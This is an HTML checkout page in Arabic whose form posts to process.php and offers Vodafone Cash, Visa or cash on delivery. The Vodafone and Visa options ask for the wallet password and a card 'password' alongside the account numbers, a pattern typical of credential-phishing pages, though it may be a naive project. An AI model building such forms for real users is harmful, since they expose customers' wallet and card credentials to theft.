<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Payment</title>
    <link rel="stylesheet" href="css/checkout.css">
    <script src="js/checkout.js" defer></script>
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>

<body>
    <h1 class="title">Payment Page</h1>
    <form id="paymentForm" action="process.php" method="POST">
    
        <input type="hidden" name="form_type" value="payment">
    
        <input type="text" name="name" id="name" placeholder="الاسم" required>
        <input type="text" name="phone" id="phone" placeholder="رقم الهاتف" required>
        <input type="text" name="address" id="address" placeholder="العنوان" required>
    
        <h3>اختار طريقة الدفع</h3>
    
        <!-- Vodafone -->
        <label class="payment-option">
            <input type="radio" name="payment" value="vodafone" onclick="showMethod('vodafone')" required>
            <span class="custom-radio"></span>
            <div class="option-content">
                <img src="./photo/images.png">
                <span>فودافون كاش</span>
            </div>
        </label>
    
        <div id="vodafoneBox" class="method-box">
            <input type="text" name="vodafone_wallet" placeholder="رقم المحفظة">
            <input type="password" name="vodafone_pass" placeholder="كلمة المرور">
        </div>
    
        <!-- Visa -->
        <label class="payment-option">
            <input type="radio" name="payment" value="visa" onclick="showMethod('visa')" required>
            <span class="custom-radio"></span>
            <div class="option-content">
                <img src="./photo/1c58492c218f6.jpg">
                <span>فيزا</span>
            </div>
        </label>
    
        <div id="visaBox" class="method-box">
            <input type="text" name="visa_card" placeholder="رقم الكارت">
            <input type="password" name="visa_pass" placeholder="كلمة المرور">
        </div>
    
        <!-- COD -->
        <label class="payment-option">
            <input type="radio" name="payment" value="cod" onclick="showMethod('cod')" required>
            <span class="custom-radio"></span>
            <div class="option-content">
                <i class="fa-solid fa-hand"></i>
                <span>الدفع عند الاستلام</span>
            </div>
        </label>
    
        <div id="codBox" class="method-box">
            <p>لن تحتاج إدخال بيانات إضافية</p>
        </div>
    
        <button type="submit">تأكيد الطلب</button>
    
    </form>
    
    <div id="successMsg" style="display:none;">✔ تم تأكيد الأوردر بنجاح</div>
</body>
</html>
